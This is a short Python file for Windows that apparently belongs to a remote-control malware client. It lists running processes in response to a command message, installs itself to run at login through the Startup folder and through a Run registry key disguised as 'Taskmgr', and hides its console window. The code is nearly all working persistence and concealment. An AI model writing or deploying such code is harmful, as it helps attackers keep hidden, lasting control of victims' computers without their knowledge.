import shutil
import subprocess
import win32console
import win32gui
import psutil
from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, OpenKey, SetValueEx

def processes(message):
    split = message.split(" ")
    params = len(split) == 2
    finalstr = ""
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if not params or (params and split[1].lower() in proc.info['name'].lower()):
                finalstr += f"PID: {proc.info['pid']}, Name: {proc.info['name']}\n"
    except Exception as e:
        return e

    return finalstr

def add_to_startup_1():
    response = "Add to startup failed"
    try:
        shutil.copy(__file__, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
        response = "Add to startup folder Success"
    except: pass
    return response

def add_to_startup_2():
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
    try:
        SetValueEx(key2change, "Taskmgr", 0, REG_SZ, __file__)
    except: return "Error occured"
    return "Successfully added startup regkey"

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
